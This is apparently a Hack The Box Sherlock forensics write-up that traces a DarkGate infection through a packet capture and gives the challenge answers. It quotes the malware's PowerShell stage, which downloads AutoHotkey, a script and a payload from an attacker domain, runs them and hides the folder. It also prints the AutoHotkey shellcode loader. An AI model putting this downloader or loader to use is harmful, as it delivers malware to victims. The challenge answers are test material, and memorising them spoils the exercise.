---
title: HTBS Takedown

---

# Hack The Box Sherlock: Takedown

## Description
> We've identified an unusual pattern in our network activity, indicating a possible security breach. Our team suspects an unauthorized intrusion into our systems, potentially compromising sensitive data. Your task is to investigate this incident.
## Initial findings
**Protocol hierarchy:**
![image](https://hackmd.io/_uploads/SJcnhcraJg.png)
Key points:
* 100% UDP packets are DNS packets, resolve to 2 domains:
```bash
$ tshark -r Takedown.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
badbutperfect.com
escuelademarina.com
```
* Overview of NetBIOS Session Service packets:
![bilde](https://hackmd.io/_uploads/HkhLMhDp1g.png)
![bilde](https://hackmd.io/_uploads/ryAI9nDpJg.png)
-> Initial connection to escuelademarina.com
* HTTP GET requests:
![bilde](https://hackmd.io/_uploads/ByRTXnPpyl.png)

**Conversations**:
![image](https://hackmd.io/_uploads/rJdA2qS6Jx.png)
-> Victim IP: 10.3.19.101
* 10.3.19.101 - 10.3.19.1:
![bilde](https://hackmd.io/_uploads/rJJ4LnDTJx.png)
-> 10.3.19.1  is a DNS resolver:
escuelademarina.com resolved to 165.22.16.55
badbutperfect.com resolved to 103.124.105.78

**Exportable objects**
![bilde](https://hackmd.io/_uploads/ByiUzpva1g.png)

## Scenario overview
The victim machine (10.3.19.101) accessed 165.22.16.55, which resolves to escuelademarina.com — a domain controlled by the threat actor:
![bilde](https://hackmd.io/_uploads/B1c102Ppyl.png)
The exact method by which the attacker compromised the victim to access their domain remains unknown.
Then a connection to attacker's IP is established:
![bilde](https://hackmd.io/_uploads/HyT4kpw6ye.png)
Following that is the establishment of SMB connectionm. The attacker attempted to authenticate (packet 13) from victim's machine to access the shared resource on `\\escuelademarina.com\cloud` :
![bilde](https://hackmd.io/_uploads/H1uXgpDpke.png)
and request the first file: 
![bilde](https://hackmd.io/_uploads/rkj1MTwT1g.png)
From the end part of the stream containing that request, the VBS script's role in this scenario seems to be initiating connection to `badbutperfect.com`, the domain which will be used to download malwares:
![bilde](https://hackmd.io/_uploads/ByT9gfuT1l.png)

## Sherlock tasks
**Task 1: From what domain is the VBS script downloaded?**
-> escuelademarina.com

**Task 2: What was the IP address associated with the domain in question #1 used for this attack?**
-> 165.22.16.55

**Task 3: What is the filename of the VBS script used for initial access?**
-> AZURE_DOC_OPEN.vbs

**Task 4: What was the URL used to get a PowerShell script?**
Here we will inspect the HTTP GET requests to look up a PowerShell script:
![bilde](https://hackmd.io/_uploads/HJrE5Twa1x.png)
-> badbutperfect.com/nrwncpwo
Analysis of the script:
1. Create a folder and move to it:
```powershell 
ni 'C:/rimz' -Type Directory -Force
cd 'C:/rimz'
```
* ni (short for New-Item) creates a new directory at C:/rimz
2. Download 3 files from `badbutperfect.com`:
```powershell
Invoke-WebRequest -Uri "http://badbutperfect.com/test2" -OutFile 'AutoHotkey.exe'
Invoke-WebRequest -Uri "http://badbutperfect.com/jvtobaqj" -OutFile 'script.ahk'
Invoke-WebRequest -Uri "http://badbutperfect.com/ozkpfzju" -OutFile 'test.txt'
```
3. Execute the malware:
```powershell
start 'AutoHotkey.exe' -a 'script.ahk'
```
4. Hide the folder (C:/rimz):
```powershell 
attrib +h 'C:/rimz'
```

**Task 5: What likely legit binary was downloaded to the victim machine?**
From the PowerShell script above and a little searching, "AutoHotKey.exe" seems to be the legit binary.
-> AutoHotKey.exe

**Task 6: From what URL was the malware used with the binary from question #5 downloaded?**
From the PowerShell script: ![bilde](https://hackmd.io/_uploads/r1ONhTvpke.png) -> the malware used with the binary "AutoHotKey.exe" is `script.ahk`, trace back: ![bilde](https://hackmd.io/_uploads/HyxYKhTw6ke.png)
-> http://badbutperfect.com/jvtobaqj

**Task 7: What filename was the malware from question #6 given on disk?**
-> script.ahk

**Task 8: What is the TLSH of the malware?**
For this task, just uploading `http://badbutperfect.com/jvtobaqj` to VirusTotal didn't work. So we need to export the file then submit it to VirusTotal.
![bilde](https://hackmd.io/_uploads/HkZCFAw61x.png)
-> T15E430A36DBC5202AD8E3074270096562FE7DC0215B4B32659C9EF16835CF6FF9B6A1B8

**Task 9: What is the name given to this malware? Use the name used by McAfee, Ikarus, and alejandro.sanchez.**
On VirusTotal -> COMMUNITY: 
![bilde](https://hackmd.io/_uploads/SkNVc0vTyg.png)
-> DarkGate

**Task 10: What is the user-agent string of the infected machine?**
Look up HTTP Response:
![bilde](https://hackmd.io/_uploads/ry3wxgOpkg.png)
-> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36

**Task 11: To what IP does the RAT from the previous question connect?**
"The RAT (Remote Access Trojan) from the previous question" = http://badbutperfect.com/jvtobaqj 
![bilde](https://hackmd.io/_uploads/SkW4-xua1l.png)
-> 103.124.105.78

## Malware analysis
The content of `script.ahk` is:
```clike
MEM_RESERVE := 0x2000
PAGE_EXECUTE_READWRITE := 0x40
archivo := A_ScriptDir . "\\test.txt"
FileRead, contenidoHex, %archivo%
size := 468705
lpAddress := DllCall("VirtualAlloc", "Ptr", 0, "UInt", size, "UInt", MEM_COMMIT | MEM_RESERVE, "UInt", PAGE_EXECUTE_READWRITE)
Loop, % size {
hexByte := "0x" . SubStr(contenidoHex, 2 * A_Index - 1, 2)
NumPut(hexByte, lpAddress + (A_Index - 1), "Char")
}
DllCall(lpAddress)
```
This malware was designed to decode the hex-encoded content of `http://badbutperfect.com/ozkpfzju (test.txt)`. The decoded content of test.txt is a program to delete drivers: 
![bilde](https://hackmd.io/_uploads/ByIqyzu61e.png)

#
> Written by 9r3y
##





